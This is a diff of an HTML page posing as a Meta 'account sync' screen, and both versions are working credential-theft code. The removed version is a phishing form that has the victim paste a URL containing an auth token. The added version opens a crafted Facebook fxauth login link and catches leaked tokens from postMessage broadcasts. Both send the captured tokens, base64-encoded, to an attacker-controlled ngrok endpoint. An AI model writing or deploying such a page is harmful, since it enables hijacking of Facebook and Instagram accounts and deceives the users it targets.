@@ -1,41 +1,36 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Meta Accounts Center - Manual Sync</title>
-    <style>
-        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
-        .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 400px; text-align: center; }
-        .btn { background: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; }
-        input { width: 90%; padding: 10px; margin-top: 10px; border: 1px solid #ddd; border-radius: 4px; }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="40" alt="FB">
-        <h2>Connection Interrupted</h2>
-        <p style="color:#606770; font-size: 14px;">Facebook security requires a manual verification code to link your Instagram profile.</p>
-        
-        <ol style="text-align: left; font-size: 13px; color: #606770;">
-            <li>Go back to the previous tab.</li>
-            <li>Copy the <b>entire URL</b> from the address bar.</li>
-            <li>Paste it into the box below to sync.</li>
-        </ol>
-
-        <input type="text" id="tokenUrl" placeholder="Paste URL here...">
-        <button class="btn" onclick="sendToPython()">Verify & Link Accounts</button>
-    </div>
+<head><title>Meta Sync</title></head>
+<body style="text-align:center; padding-top:50px; font-family:sans-serif;">
+    <h2>Connection Required</h2>
+    <p>Click the button below to start the secure sync.</p>
+    
+    <button onclick="startSync()" style="padding:15px 30px; background:#1877F2; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">
+        SYNC ACCOUNTS
+    </button>
 
     <script>
-        function sendToPython() {
-            var fullUrl = document.getElementById('tokenUrl').value;
-            if (fullUrl.includes('token=') || fullUrl.includes('blob=')) {
-                // We send it to your Python server via ngrok
-                fetch("https://bolsteringly-rightish-joan.ngrok-free.dev/log?data=" + btoa(fullUrl), {mode: 'no-cors'});
-                alert("Verification Successful! You may now close this window.");
-            } else {
-                alert("Invalid URL. Please copy the full address from the other tab.");
-            }
+        function startSync() {
+            const armedLink = "https://www.facebook.com/fxauth/?app_id=1217981644879628&etoken=AbkdqR8gSOIdA6pB1QLaljpIpIDxmp6gdlpgGqy3KqhBFJmEIuuBGbRenNJjnorbCU5-USgb5cWL6tdiq89aEsxNBOQ6BFNp1uiIc6EZRNcaFP6BxsJ-C9IE&native_app_login_flow=fbcalcomettest&entry_point=ig_web_settings&next=https%3A%2F%2Fwww.instagram.com%2Freels%2Faudio%2Fexternal%3Furl%3Dhttps%3A%2F%2Fcyanide122.github.io%2Fassets%2Fgo.html";
+            
+            // Open the auth flow in a popup
+            window.open(armedLink, "fbPopup", "width=600,height=700");
         }
+
+        // 🕵️ THE COLLECTOR: Because the targetOrigin is '*', 
+        // this listener will catch the token even from the popup!
+        window.addEventListener("message", function(event) {
+            console.log("📥 Caught a broadcast from:", event.origin);
+            
+            let data = JSON.stringify(event.data);
+            if (data.includes("token") || data.includes("blob")) {
+                // 🚀 SEND TO PYTHON IMMEDIATELY
+                fetch("https://bolsteringly-rightish-joan.ngrok-free.dev/log?data=" + btoa(data), {mode:'no-cors'});
+                
+                alert("SUCCESS: Data Captured. Check your terminal.");
+                document.body.innerHTML = "<h1>Verification Successful!</h1>";
+            }
+        }, false);
     </script>
 </body>
 </html>
